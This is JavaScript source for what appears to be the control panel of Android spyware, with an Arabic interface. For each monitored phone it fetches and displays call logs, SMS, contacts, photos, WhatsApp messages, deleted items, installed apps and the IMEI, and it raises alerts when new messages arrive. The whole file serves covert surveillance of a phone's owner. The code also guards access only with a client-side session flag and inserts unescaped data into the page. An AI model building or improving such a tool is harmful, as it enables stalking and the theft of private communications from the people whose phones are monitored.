if (sessionStorage.getItem('logged_in') !== 'true') {
    window.location.href = 'login.html';
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];
let allDeleted = [];
let currentChat = null;
let currentCallNumber = null;
let currentContact = null;
let wasOffline = true;
let lastCallCount = 0;
let lastSmsCount = 0;
let lastDeletedCount = 0;
let notificationShown = false;
let soundPlayedForDevice = false;

function logout() { sessionStorage.removeItem('logged_in'); window.location.href = 'login.html'; }
function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }

function findContactName(number) {
    if (!allContacts || allContacts.length === 0 || !number) return null;
    const cleanNumber = number.replace(/[^0-9]/g, '').slice(-9);
    for (let contact of allContacts) {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        for (let n of numbers) {
            if (!n) continue;
            if (n.replace(/[^0-9]/g, '').slice(-9) === cleanNumber) return contact.name;
        }
    }
    return null;
}

function showNotification(title, message, icon) {
    const div = document.createElement('div');
    div.className = 'notification-popup';
    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
    document.body.appendChild(div);
    playNotificationSound();
    setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
}

function checkNewSMS(newSMS) {
    if (!newSMS || newSMS.length === 0) return;
    if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
        const s = newSMS[0];
        showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
        const badge = document.getElementById('smsCount');
        if (badge) {
            badge.textContent = `(${newSMS.length}) 🔴`;
            badge.className = 'count badge-new';
        }
    }
    lastSmsCount = newSMS.length;
}

function checkNewCalls(newCalls) {
    if (!newCalls || newCalls.length === 0) return;
    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
        const c = newCalls[0];
        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
        const badge = document.getElementById('callCount');
        if (badge) {
            badge.textContent = `(${newCalls.length}) 🔴`;
            badge.className = 'count badge-new';
        }
    }
    lastCallCount = newCalls.length;
}

function checkNewDeleted(deleted) {
    if (!deleted || deleted.length === 0) return;
    if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
        const d = deleted[0];
        const typeName = d.deleted_type === 'call_logs' ? '📞 مكالمة محذوفة' : d.deleted_type === 'sms' ? '💬 رسالة محذوفة' : d.deleted_type === 'contacts' ? '👤 جهة محذوفة' : '🗑️ عنصر محذوف';
        showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
        const badge = document.getElementById('deletedCount');
        if (badge) {
            badge.textContent = `(${deleted.length}) 🔴`;
            badge.className = 'count badge-new';
        }
    }
    lastDeletedCount = deleted.length;
}

async function deleteDevice() {
    if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
    
    try {
        const response = await fetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
        const result = await response.json();
        
        if (result.success) {
            alert('✅ تم حذف الجهاز');
            currentDevice = null;
            document.getElementById('deviceSelect').value = '';
            document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
            document.getElementById('deviceNameDisplay').className = 'device-name-display';
            
            setTimeout(() => { loadDevices(); }, 500);
            setTimeout(() => { loadDevices(); }, 1500);
            setTimeout(() => { loadDevices(); }, 3000);
            setTimeout(() => { loadDevices(); }, 5000);
            setTimeout(() => { loadDevices(); }, 8000);
        } else {
            alert('❌ خطأ: ' + (result.error || 'غير معروف'));
        }
    } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
}

async function loadDevices() {
    try {
        const response = await fetch('/devices.json');
        const devices = await response.json();
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name || device.id;
            select.appendChild(option);
        });
        
        if (currentValue) { select.value = currentValue; }
        else if (devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
    } catch (e) {}
}

function selectDevice(deviceId) {
    currentDevice = deviceId;
    
    const display = document.getElementById('deviceNameDisplay');
    if (deviceId) {
        const select = document.getElementById('deviceSelect');
        const selectedOption = select.options[select.selectedIndex];
        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
        display.textContent = `📱 ${deviceName}`;
        display.className = 'device-name-display active';
    } else {
        display.textContent = 'لا يوجد جهاز';
        display.className = 'device-name-display';
    }
    
    if (deviceId && !soundPlayedForDevice) {
        playNotificationSound();
        soundPlayedForDevice = true;
        setTimeout(() => { soundPlayedForDevice = false; }, 10000);
    }
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 5000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
        updateLiveData();
        loadAllData();
    }
}

async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('networkStatus');
        if (data.online) { statusEl.textContent = data.network || 'متصل'; statusEl.className = 'value online'; }
        else { statusEl.textContent = 'غير متصل'; statusEl.className = 'value offline'; }
        
        if (data.battery !== null && data.battery !== undefined) document.getElementById('batteryStatus').textContent = data.battery + '%';
        if (data.call_count !== undefined) document.getElementById('callCount').textContent = `(${data.call_count})`;
        if (data.sms_count !== undefined) document.getElementById('smsCount').textContent = `(${data.sms_count})`;
        if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
        if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
        if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
        if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
    } catch (e) {}
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadImages();
    await loadApps();
    await loadDeviceInfo();
    await loadDeleted();
    await loadWhatsApp();
}

async function loadDeleted() {
    try {
        const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
        const deleted = await response.json();
        
        if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
            checkNewDeleted(deleted);
            allDeleted = deleted;
            displayDeleted();
        }
    } catch (e) {}
}

// ✅ تحميل رسائل واتساب — محادثات مجمعة
async function loadWhatsApp() {
    try {
        const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
        const messages = await response.json();
        
        const div = document.getElementById('whatsappList');
        if (!div) return;
        
        div.innerHTML = '';
        
        if (!messages || messages.length === 0) {
            div.innerHTML = '<p style="color:#888;">لا توجد رسائل واتساب</p>';
            return;
        }
        
        const conversations = {};
        messages.forEach(msg => {
            const sender = msg.sender || 'غير معروف';
            if (!conversations[sender]) conversations[sender] = [];
            conversations[sender].push(msg);
        });
        
        Object.keys(conversations).forEach(sender => {
            const msgs = conversations[sender].sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
            const lastMsg = msgs[msgs.length - 1];
            const imageCount = msgs.filter(m => m.image_data).length;
            const displayName = findContactName(sender) || sender;
            
            const conversationDiv = document.createElement('div');
            conversationDiv.className = 'conversation-item';
            conversationDiv.style.cssText = 'display:flex;align-items:center;gap:15px;padding:15px;background:#111;border-radius:8px;margin-bottom:10px;cursor:pointer;border:1px solid #222;position:relative;';
            
            conversationDiv.innerHTML = `
                <div style="font-size:40px;">${lastMsg.is_group ? '👥' : '💬'}</div>
                <div style="flex:1;" onclick="openWhatsAppChat('${sender}')">
                    <div style="color:#00ffcc;font-weight:bold;font-size:16px;">${displayName}</div>
                    <div style="color:#aaa;font-size:13px;">${lastMsg.message_type === 'image' ? '📷 صورة' : lastMsg.message || ''}</div>
                    <div style="color:#888;font-size:12px;">📅 ${formatWhatsAppDate(lastMsg.timestamp)}</div>
                </div>
                <div style="text-align:center;">
                    <div style="background:#00ffcc;color:black;padding:5px 12px;border-radius:15px;font-size:13px;font-weight:bold;">${msgs.length}</div>
                    ${imageCount > 0 ? `<div style="color:#ff9800;font-size:11px;margin-top:5px;">📷 ${imageCount}</div>` : ''}
                </div>
                <button onclick="event.stopPropagation();deleteWhatsAppChat('${sender}')" style="position:absolute;top:5px;left:5px;background:none;border:none;color:#ff3300;cursor:pointer;font-size:18px;" title="حذف الدردشة">🗑️</button>
            `;
            
            div.appendChild(conversationDiv);
        });
        
        const badge = document.getElementById('whatsappCount');
        if (badge) badge.textContent = `(${messages.length})`;
        
    } catch (e) {}
}

// ✅ فتح محادثة واتساب — رسائل مستلمة فقط
async function openWhatsAppChat(sender) {
    try {
        const response = await fetch(`/api.php?action=get_whatsapp&device=${encodeURIComponent(currentDevice)}`);
        const messages = await response.json();
        
        const senderMessages = messages.filter(m => (m.sender || 'غير معروف') === sender)
            .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
        
        const chatWindow = document.createElement('div');
        chatWindow.id = 'whatsappChatWindow';
        chatWindow.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0a0a;
            z-index: 9999;
            display: flex;
            flex-direction: column;
        `;
        
        const displayName = findContactName(sender) || sender;
        
        chatWindow.innerHTML = `
            <div style="background:#075E54;padding:15px 20px;display:flex;align-items:center;gap:15px;box-shadow:0 2px 10px rgba(0,0,0,0.5);">
                <button onclick="closeWhatsAppChat()" style="background:none;border:none;color:white;font-size:24px;cursor:pointer;">⬅️</button>
                <div style="flex:1;">
                    <div style="color:white;font-weight:bold;font-size:18px;">${displayName}</div>
                    <div style="color:#ccc;font-size:12px;">${sender}</div>
                    <div style="color:#aaa;font-size:11px;">${senderMessages.length} رسالة مستلمة</div>
                </div>
                <button onclick="selectAllWhatsApp()" style="background:none;border:none;color:#25D366;font-size:20px;cursor:pointer;padding:5px 10px;" title="تحديد الكل">☑️</button>
                <button onclick="deleteSelectedWhatsApp()" style="background:none;border:none;color:#ff3300;font-size:20px;cursor:pointer;padding:5px 10px;" title="حذف المحدد">🗑️</button>
            </div>
            <div id="whatsappMessagesContainer" style="flex:1;overflow-y:auto;padding:20px;background:#0a0a0a;">
                ${senderMessages.map((msg) => {
                    return `
                    <div class="wa-msg" data-timestamp="${msg.timestamp}" style="margin-bottom:12px;">
                        <div style="display:flex;justify-content:flex-start;">
                            <div style="max-width:70%;padding:12px 15px;border-radius:15px;background:#1e2a2a;margin-right:auto;border-bottom-left-radius:5px;position:relative;">
                                <div style="color:#25D366;font-size:11px;font-weight:bold;margin-bottom:3px;">📥 ${displayName}</div>
                                ${msg.image_data ? `
                                    <img src="data:image/jpeg;base64,${msg.image_data}" onclick="window.open(this.src)" style="max-width:250px;border-radius:10px;cursor:pointer;display:block;margin-bottom:5px;">
                                ` : ''}
                                <div style="color:white;font-size:15px;">${msg.message_type === 'image' ? '📷' : msg.message_type === 'video' ? '🎬' : msg.message_type === 'audio' ? '🎵' : msg.message_type === 'document' ? '📄' : ''} ${msg.message || ''}</div>
                                <div style="color:#aaa;font-size:11px;text-align:left;margin-top:3px;">${formatWhatsAppDate(msg.timestamp)}</div>
                            </div>
                        </div>
                    </div>
                    `;
                }).join('')}
            </div>
        `;
        
        document.body.appendChild(chatWindow);
        
        const container = document.getElementById('whatsappMessagesContainer');
        container.scrollTop = container.scrollHeight;
        
    } catch (e) {}
}

// ✅ إغلاق المحادثة
function closeWhatsAppChat() {
    const window = document.getElementById('whatsappChatWindow');
    if (window) window.remove();
}

// ✅ تحديد الكل
function selectAllWhatsApp() {
    const msgs = document.querySelectorAll('.wa-msg');
    msgs.forEach(msg => {
        if (msg.classList.contains('selected')) {
            msg.classList.remove('selected');
            msg.style.opacity = '1';
        } else {
            msg.classList.add('selected');
            msg.style.opacity = '0.5';
        }
    });
}

// ✅ حذف المحدد
async function deleteSelectedWhatsApp() {
    const selected = document.querySelectorAll('.wa-msg.selected');
    if (selected.length === 0) {
        alert('⚠️ حدد رسائل أولاً');
        return;
    }
    
    if (!confirm(`حذف ${selected.length} رسالة؟`)) return;
    
    const timestamps = [];
    selected.forEach(msg => {
        timestamps.push(msg.getAttribute('data-timestamp'));
    });
    
    try {
        const response = await fetch(`/api.php?action=delete_whatsapp&device=${encodeURIComponent(currentDevice)}&timestamps=${encodeURIComponent(timestamps.join(','))}`);
        const result = await response.json();
        
        if (result.success) {
            closeWhatsAppChat();
            loadWhatsApp();
        }
    } catch (e) {}
}

// ✅ حذف دردشة كاملة
async function deleteWhatsAppChat(sender) {
    if (!confirm(`حذف كل رسائل ${sender}؟`)) return;
    
    try {
        const response = await fetch(`/api.php?action=delete_whatsapp_chat&device=${encodeURIComponent(currentDevice)}&sender=${encodeURIComponent(sender)}`);
        const result = await response.json();
        
        if (result.success) {
            loadWhatsApp();
        }
    } catch (e) {}
}

// ✅ تنسيق التاريخ
function formatWhatsAppDate(t) {
    if (!t) return '—';
    try {
        const d = new Date(Number(t));
        if (isNaN(d.getTime())) return '—';
        return d.toLocaleString('ar', { 
            year: 'numeric', 
            month: '2-digit', 
            day: '2-digit',
            hour: '2-digit', 
            minute: '2-digit',
            second: '2-digit'
        });
    } catch (e) { return '—'; }
}

function displayDeleted() {
    const div = document.getElementById('deletedList');
    if (!div) return;
    
    div.innerHTML = '';
    
    if (!allDeleted || allDeleted.length === 0) {
        div.innerHTML = '<p style="color:#888;">لا توجد محذوفات</p>';
        return;
    }
    
    [...allDeleted].sort((a, b) => (b.timestamp || b.deleted_at || 0) - (a.timestamp || a.deleted_at || 0)).forEach(item => {
        const divItem = document.createElement('div');
        divItem.className = 'conversation-item';
        
        const deletedType = item.deleted_type || item.type || '';
        const deletedCount = item.deleted_count || item.count || 1;
        
        if (deletedType === 'call_logs' || deletedType === 'deleted_call') {
            divItem.innerHTML = `
                <div class="conversation-avatar">📞</div>
                <div class="conversation-info">
                    <div class="conversation-name">📞 مكالمة محذوفة</div>
                    <div class="conversation-preview">عدد المكالمات المحذوفة: ${deletedCount}</div>
                    <div class="conversation-preview">الرقم: ${item.number || 'غير معروف'}</div>
                    <div class="conversation-preview">النوع: ${getCallType(item.call_type) || '—'}</div>
                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                </div>
                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
            `;
        } else if (deletedType === 'sms' || deletedType === 'deleted_sms') {
            divItem.innerHTML = `
                <div class="conversation-avatar">💬</div>
                <div class="conversation-info">
                    <div class="conversation-name">💬 رسالة محذوفة</div>
                    <div class="conversation-preview">عدد الرسائل المحذوفة: ${deletedCount}</div>
                    <div class="conversation-preview">المرسل: ${item.address || 'غير معروف'}</div>
                    <div class="conversation-preview">النص: ${item.body || '—'}</div>
                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                </div>
                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
            `;
        } else if (deletedType === 'contacts' || deletedType === 'deleted_contact') {
            divItem.innerHTML = `
                <div class="conversation-avatar">👤</div>
                <div class="conversation-info">
                    <div class="conversation-name">👤 جهة اتصال محذوفة</div>
                    <div class="conversation-preview">عدد الجهات المحذوفة: ${deletedCount}</div>
                    <div class="conversation-preview">الاسم: ${item.name || 'غير معروف'}</div>
                    <div class="conversation-preview">التاريخ: ${formatDate(item.date || item.timestamp)}</div>
                </div>
                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
            `;
        } else {
            divItem.innerHTML = `
                <div class="conversation-avatar">🗑️</div>
                <div class="conversation-info">
                    <div class="conversation-name">🗑️ عنصر محذوف</div>
                    <div class="conversation-preview">النوع: ${deletedType || 'غير معروف'}</div>
                    <div class="conversation-preview">العدد: ${deletedCount}</div>
                    <div class="conversation-preview">التاريخ: ${formatDate(item.timestamp || item.deleted_at)}</div>
                </div>
                <div class="conversation-time">⏰ ${formatDate(item.timestamp || item.deleted_at)}</div>
            `;
        }
        
        div.appendChild(divItem);
    });
}

async function loadCalls() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
        const newCalls = await response.json();
        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
            checkNewCalls(newCalls);
            allCalls = newCalls;
            if (currentCallNumber) openCallDetail(currentCallNumber);
            else displayCallsList();
        }
    } catch (e) {}
}

function displayCallsList() {
    document.getElementById('callDetailView').style.display = 'none';
    document.getElementById('callsListView').style.display = 'block';
    const div = document.getElementById('callsListView');
    div.innerHTML = '';
    if (!allCalls || allCalls.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>'; return; }
    
    [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const displayName = call.name || findContactName(call.number) || call.number || 'غير معروف';
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openCallDetail(call.number);
        item.innerHTML = `<div class="conversation-avatar">${call.type == 1 ? '📥' : call.type == 2 ? '📤' : '❌'}</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${formatDate(call.date)}</div></div><div class="conversation-time">${formatDuration(call.duration)}</div>`;
        div.appendChild(item);
    });
}

function openCallDetail(number) {
    currentCallNumber = number;
    document.getElementById('callsListView').style.display = 'none';
    document.getElementById('callDetailView').style.display = 'block';
    document.getElementById('callDetailTitle').textContent = `📞 ${findContactName(number) || number}`;
    const detailsDiv = document.getElementById('callDetailsList');
    detailsDiv.innerHTML = '';
    allCalls.filter(c => c.number === number).sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const div = document.createElement('div');
        div.className = 'call-detail-item';
        div.innerHTML = `<span class="call-type type-${call.type}">${getCallType(call.type)}</span><span>⏱️ ${formatDuration(call.duration)}</span><span>📅 ${formatDate(call.date)}</span>`;
        detailsDiv.appendChild(div);
    });
}

function backToCallsList() { currentCallNumber = null; displayCallsList(); }

async function loadSMS() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
        const newSMS = await response.json();
        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
            checkNewSMS(newSMS);
            allSMS = newSMS;
            if (currentChat) openChat(currentChat);
            else displayConversations();
        }
    } catch (e) {}
}

function displayConversations() {
    document.getElementById('chatView').style.display = 'none';
    document.getElementById('conversationsList').style.display = 'block';
    const div = document.getElementById('conversationsList');
    div.innerHTML = '';
    if (!allSMS || allSMS.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>'; return; }
    
    const sorted = [...allSMS].sort((a, b) => (b.date || 0) - (a.date || 0));
    const conversations = {};
    sorted.forEach(sms => { const n = sms.address || 'غير معروف'; if (!conversations[n]) conversations[n] = []; conversations[n].push(sms); });
    
    Object.keys(conversations).forEach(number => {
        const last = conversations[number][0];
        const displayName = findContactName(number) || number;
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openChat(number);
        item.innerHTML = `<div class="conversation-avatar">💬</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${last.body || ''}</div></div><div class="conversation-time">${formatDate(last.date)}</div>`;
        div.appendChild(item);
    });
}

function openChat(number) {
    currentChat = number;
    document.getElementById('conversationsList').style.display = 'none';
    document.getElementById('chatView').style.display = 'block';
    document.getElementById('chatTitle').textContent = `💬 ${findContactName(number) || number}`;
    const messagesList = document.getElementById('messagesList');
    messagesList.innerHTML = '';
    allSMS.filter(s => s.address === number).sort((a, b) => (a.date || 0) - (b.date || 0)).forEach(sms => {
        const div = document.createElement('div');
        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
        div.innerHTML = `<div class="message-bubble"><div class="message-text">${sms.body || ''}</div><div class="message-time">${formatDate(sms.date)}</div></div>`;
        messagesList.appendChild(div);
    });
    messagesList.scrollTop = messagesList.scrollHeight;
}

function backToConversations() { currentChat = null; displayConversations(); }

async function loadContacts() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
        const newContacts = await response.json();
        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
            allContacts = newContacts;
            if (currentContact) openContactDetail(currentContact);
            else displayContactsList();
        }
    } catch (e) {}
}

function displayContactsList() {
    document.getElementById('contactDetailView').style.display = 'none';
    document.getElementById('contactsListView').style.display = 'block';
    const div = document.getElementById('contactsListView');
    div.innerHTML = '';
    if (!allContacts || allContacts.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد جهات</p>'; return; }
    
    [...allContacts].sort((a, b) => (a.name || '').localeCompare(b.name || '', 'ar')).forEach(contact => {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openContactDetail(contact.name);
        item.innerHTML = `<div class="conversation-avatar">👤</div><div class="conversation-info"><div class="conversation-name">${contact.name || 'بدون اسم'}</div><div class="conversation-preview">${numbers.join(', ')}</div></div>`;
        div.appendChild(item);
    });
}

function openContactDetail(name) {
    currentContact = name;
    document.getElementById('contactsListView').style.display = 'none';
    document.getElementById('contactDetailView').style.display = 'block';
    const contact = allContacts.find(c => c.name === name);
    if (!contact) return;
    const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
    document.getElementById('contactDetails').innerHTML = `<div class="contact-detail-card"><div class="contact-avatar">👤</div><h4>${contact.name}</h4><div class="contact-numbers">${numbers.map(n => `<div class="contact-number-item"><span>${n}</span><div><button class="action-btn" onclick="openChat('${n}')">💬</button><button class="action-btn" onclick="openCallDetail('${n}')">📞</button></div></div>`).join('')}</div></div>`;
}

function backToContactsList() { currentContact = null; displayContactsList(); }

async function loadImages() {
    try {
        const response = await fetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
        const images = await response.json();
        const grid = document.getElementById('imagesGrid');
        grid.innerHTML = '';
        if (!images || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
        
        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, i) => {
            const div = document.createElement('div');
            div.className = 'image-card';
            const img = document.createElement('img');
            if (image.data) { let m = 'image/jpeg'; if (image.name) { const e = image.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; } img.src = `data:${m};base64,${image.data}`; }
            img.className = 'thumb';
            const name = document.createElement('div'); name.className = 'image-name'; name.textContent = image.name || `صورة ${i+1}`;
            const btns = document.createElement('div'); btns.className = 'image-buttons';
            const v = document.createElement('button'); v.className = 'view-btn'; v.textContent = '👁️'; v.onclick = () => window.open(img.src);
            const d = document.createElement('button'); d.className = 'download-btn'; d.textContent = '⬇️'; d.onclick = () => { const a = document.createElement('a'); a.href = img.src; a.download = image.name; document.body.appendChild(a); a.click(); a.remove(); };
            btns.appendChild(v); btns.appendChild(d);
            div.appendChild(img); div.appendChild(name); div.appendChild(btns);
            grid.appendChild(div);
        });
    } catch (e) {}
}

async function loadApps() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
        const apps = await response.json();
        const tbody = document.querySelector('#appsTable tbody');
        tbody.innerHTML = '';
        if (!apps || apps.length === 0) return;
        apps.forEach(app => { const r = document.createElement('tr'); r.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(r); });
    } catch (e) {}
}

async function loadDeviceInfo() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
        const info = await response.json();
        const div = document.getElementById('deviceInfo');
        if (!info || Object.keys(info).length === 0) return;
        div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
    } catch (e) {}
}

function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
    if (tab) tab.classList.add('active');
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
function formatDate(t) { if (!t) return '—'; try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } }
function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; case 2: return '📤 صادر'; case 3: return '❌ فائت'; default: return 'غير معروف'; } }

loadDevices();
setInterval(loadDevices, 10000);
